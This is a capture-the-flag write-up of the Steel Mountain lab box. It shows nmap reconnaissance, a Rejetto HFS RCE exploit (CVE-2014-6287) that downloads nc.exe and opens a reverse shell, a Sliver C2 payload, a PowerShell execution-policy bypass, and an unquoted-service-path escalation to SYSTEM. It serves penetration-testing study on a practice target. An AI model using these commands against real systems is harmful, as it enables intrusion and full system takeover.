# IP
`10.10.225.227`

# Reconnaissaince

`nmap -sC -sV 10.10.225.227`
```
Nmap scan report for 10.10.225.227
Host is up (0.12s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2023-05-11T01:49:52
|_Not valid after:  2023-11-10T01:49:52
|_ssl-date: 2023-05-12T01:52:06+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2023-05-12T01:52:03+00:00
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 021d6664721f (unknown)
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2023-05-12T01:52:01
|_  start_date: 2023-05-12T01:49:43
| smb2-security-mode: 
|   302: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

```

When we go on the website on port 80, we see an image of the name `BillHarper.png` under the "Best Employee" heading.

There is also a file server on port 8080
	If we look at the source, we can see that it is a "`Rejetto HTTP File Server`" version HFS 2.3


	We can look this up and see that there is a CVE assigned to an RCE vuln: CVE-`2014-6287`


# Exploitation

Instead of using metasploit, we can search for an exploit using `searchsploit rejetto`

We can then mirror the script with `searchsploit -m windows/remote/39161.py`

We have to modify the exploit with our own IP and port and then host an http file server on port 80 with `nc.exe` in it.

We can host the file server with `sudo python3 -m http.server 80` 

We can set up a listener with `rlwrap nc -lnvp 1337`

We can then run the exploit until we get a reverse shell: `python2 exploit.py 10.10.225.227 8080`

The user flag is in `C:\Users\bill\Desktop`


### Modifying the exploit to run a sliver payload

We can generate a payload with `generate --mtls <tun0>` and can start a listener with `mtls`. My payload is called `DIRTY_DATA.exe`

All we have to do is change `nc.exe` to the name of our payload and remove the arguments from `nc.exe` (since sliver payloads have the ip and port to call back to built-in)

This will make it easier for us to upload scripts like that of `PowerUp.ps1`


# Privilege Escalation

### PowerUp

To run ps1 scripts, we have to get into powershell. To ensure we can also run scripts, we run `powershell -ep bypass` to bypass the execution policy if it exists

We can then run `Import-Module .\PowerUp.ps1` and `Invoke-AllChecks`


Several services have an Unquoted Service Path vulnerability, but only one (`AdvancedSystemCareService9`) has permissions for us to restart it


We can go back into cmd and run `sc qc AdvancedSystemCareService9`

```

SERVICE_NAME: AdvancedSystemCareService9
        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
        LOAD_ORDER_GROUP   : System Reserved
        TAG                : 1
        DISPLAY_NAME       : Advanced SystemCare Service 9
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

```

Here, we can see that the service is run as LocalSystem, which means if we take advantage of this and restart the service, we will have admin.

I'm going to place the same sliver payload we uploaded into `C:\Program Files (x86)\IObit\Advanced.exe`


We can then run `net stop AdvancedSystemCareService9` and `net start AdvancedSystemCareService9`

This gets us a session back on sliver as `NT Authority\SYSTEM`

The root flag is in `C:\Users\Administrator\Desktop\root.txt`